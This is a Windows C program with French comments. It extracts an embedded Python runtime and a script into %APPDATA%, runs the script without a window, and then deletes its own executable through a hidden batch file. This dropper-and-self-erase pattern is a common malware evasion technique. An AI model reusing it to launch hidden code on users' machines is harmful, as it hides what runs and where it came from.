#include <windows.h>
#include <shlobj.h>  // Pour SHGetFolderPath
#include <stdio.h>
#include <stdlib.h>
#include "miniz.h"   // Inclure la bibliothèque miniz
#include <sys/stat.h> // Pour mkdir

#define ZIPFILE 101       // ID de la ressource pour python-3.8.0-embed-amd64.zip
#define PYTHONSCRIPT 102  // ID de la ressource pour mon_script.py

// Fonction pour créer récursivement les sous-dossiers
void create_directory_recursive(const char *path) {
    char temp_path[MAX_PATH];
    char *p = NULL;
    size_t len;

    snprintf(temp_path, sizeof(temp_path), "%s", path);
    len = strlen(temp_path);

    // Remplacer les '/' par des '\'
    for (p = temp_path; *p; p++) {
        if (*p == '/') {
            *p = '\\';
        }
    }

    // Créer chaque dossier du chemin
    for (p = temp_path + 1; *p; p++) {
        if (*p == '\\') {
            *p = 0;
            mkdir(temp_path);  // Créer le répertoire
            *p = '\\';
        }
    }

    // Créer le dernier répertoire dans le chemin
    mkdir(temp_path);
}

// Fonction pour enregistrer une ressource dans un fichier
void save_resource_to_file(const char *resource_name, const char *filename) {
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(resource_name), RT_RCDATA);
    if (!hRes) {
        printf("Impossible de trouver la ressource : %s\n", resource_name);
        return;
    }

    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) {
        printf("Impossible de charger la ressource : %s\n", resource_name);
        return;
    }

    DWORD dataSize = SizeofResource(NULL, hRes);
    void *data = LockResource(hData);

    FILE *file = fopen(filename, "wb");
    if (!file) {
        printf("Impossible de créer le fichier : %s\n", filename);
        return;
    }
    fwrite(data, 1, dataSize, file);
    fclose(file);
}

// Fonction pour créer le chemin %APPDATA%\resource
void create_resource_folder(char *resource_path) {
    char appdata_path[MAX_PATH];
    
    if (SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appdata_path) != S_OK) {
        printf("Erreur : Impossible d'obtenir le chemin %%APPDATA%%\n");
        return;
    }

    snprintf(resource_path, MAX_PATH, "%s\\resource", appdata_path);
    CreateDirectory(resource_path, NULL);
}

// Fonction pour décompresser un fichier ZIP dans un dossier avec gestion des sous-dossiers
void decompress_zip(const char *zip_path, const char *extract_path) {
    // Ouvrir le fichier ZIP
    mz_zip_archive zip_archive;
    memset(&zip_archive, 0, sizeof(zip_archive));

    if (!mz_zip_reader_init_file(&zip_archive, zip_path, 0)) {
        printf("Impossible d'ouvrir le fichier ZIP : %s\n", zip_path);
        return;
    }

    // Extraire les fichiers
    int num_files = (int)mz_zip_reader_get_num_files(&zip_archive);
    for (int i = 0; i < num_files; i++) {
        mz_zip_archive_file_stat file_stat;
        if (!mz_zip_reader_file_stat(&zip_archive, i, &file_stat)) {
            printf("Erreur lors de la récupération des informations du fichier ZIP\n");
            continue;
        }

        // Créer le chemin de sortie complet
        char extract_file_path[MAX_PATH];
        snprintf(extract_file_path, MAX_PATH, "%s\\%s", extract_path, file_stat.m_filename);

        // Si c'est un dossier, le créer
        if (mz_zip_reader_is_file_a_directory(&zip_archive, i)) {
            create_directory_recursive(extract_file_path);
            printf("Dossier créé : %s\n", extract_file_path);
            continue;
        }

        // Créer les répertoires nécessaires si le fichier est dans un sous-dossier
        char *last_slash = strrchr(extract_file_path, '\\');
        if (last_slash) {
            *last_slash = 0;
            create_directory_recursive(extract_file_path);
            *last_slash = '\\';
        }

        // Extraire le fichier
        if (!mz_zip_reader_extract_to_file(&zip_archive, i, extract_file_path, 0)) {
            printf("Erreur lors de l'extraction du fichier : %s\n", extract_file_path);
        } else {
            printf("Fichier extrait : %s\n", extract_file_path);
        }
    }

    mz_zip_reader_end(&zip_archive);
}

// Fonction pour supprimer l'exécutable après l'exécution
void delete_executable() {
    char exe_path[MAX_PATH];
    GetModuleFileName(NULL, exe_path, MAX_PATH);

    // Créer un fichier batch pour supprimer l'exécutable
    char batch_path[MAX_PATH];
    DWORD temp_path_length = GetTempPath(MAX_PATH, batch_path);  // Obtenir le chemin temporaire

    // Vérifier si l'appel a réussi
    if (temp_path_length == 0 || temp_path_length > MAX_PATH) {
        printf("Erreur lors de la récupération du chemin temporaire.\n");
        return;
    }

    // Ajoutez le nom du fichier batch au chemin temporaire
    strcat(batch_path, "delete.bat");

    FILE *batch_file = fopen(batch_path, "w");
    if (batch_file) {
        fprintf(batch_file, "@echo off\n");
        fprintf(batch_file, "timeout /t 3 /nobreak >nul\n");  // Attendre 3 secondes
        fprintf(batch_file, "del \"%s\"\n", exe_path);
        fprintf(batch_file, "exit\n");
        fclose(batch_file);

        // Exécuter le fichier batch en arrière-plan
        STARTUPINFO si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        CreateProcess(NULL, batch_path, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

int main() {
    // Créer le dossier resource dans %APPDATA%
    char resource_path[MAX_PATH];
    create_resource_folder(resource_path);
    printf("Dossier resource créé : %s\n", resource_path);

    // Chemin pour stocker temporairement le fichier ZIP embedded
    char temp_zip_path[MAX_PATH];
    snprintf(temp_zip_path, sizeof(temp_zip_path), "%s\\python_embed.zip", resource_path);

    // Extraire le fichier ZIP Python embedded dans %APPDATA%\resource
    save_resource_to_file(MAKEINTRESOURCE(ZIPFILE), temp_zip_path);
    printf("Python embedded ZIP extrait dans : %s\n", temp_zip_path);

    // Décompresser le fichier ZIP dans %APPDATA%\resource
    decompress_zip(temp_zip_path, resource_path);

    // Extraire le script Python directement dans %APPDATA%\resource
    char script_path[MAX_PATH];
    snprintf(script_path, sizeof(script_path), "%s\\mon_script.pyw", resource_path);
    save_resource_to_file(MAKEINTRESOURCE(PYTHONSCRIPT), script_path);
    printf("Script Python extrait dans : %s\n", script_path);

    // Construire le chemin pour python.exe et mon_script.pyw dans %APPDATA%\Roaming\resource
    char python_exe_path[MAX_PATH];
    snprintf(python_exe_path, sizeof(python_exe_path), "%s\\python.exe", resource_path);

    // Construire la commande pour exécuter le script .pyw avec python.exe depuis %APPDATA%
    char command[MAX_PATH * 2];
    snprintf(command, sizeof(command), "start \"%s\\pythonw.exe\" \"%s\\mon_script.pyw\"", resource_path, resource_path);

    // Exécuter le script Python avec python.exe
    printf("Exécution de la commande : %s\n", command);
    int result = system(command);

    if (result != 0) {
        printf("Erreur lors de l'exécution du script Python\n");
    }

    delete_executable();
    return 0;
}
